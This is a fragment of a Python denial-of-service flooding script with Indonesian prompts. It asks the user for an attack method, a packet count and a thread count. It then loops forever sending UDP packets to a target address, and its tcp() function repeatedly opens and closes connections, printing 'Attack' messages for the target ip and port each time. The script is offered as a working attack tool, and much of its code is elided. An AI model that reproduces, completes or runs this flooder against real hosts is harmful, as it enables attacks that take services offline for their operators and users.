...
choice = str(input(" \033[94mMAu-metode-apa \033[1;31;40m    ====> : "))
times = int(input(" \033[94mBerapa packet \033[1;31;40m      ====> : "))
threads = int(input("\033[94m Berapa Threads \033[1;31;40m    ====> : "))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(" 0xF1 Daka %s Attack %s"%(ip,port))
		except:
			print(" 0xF1 Daka %s Attack %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m 0xF1 Daka %s Attack %s"%(ip,port))
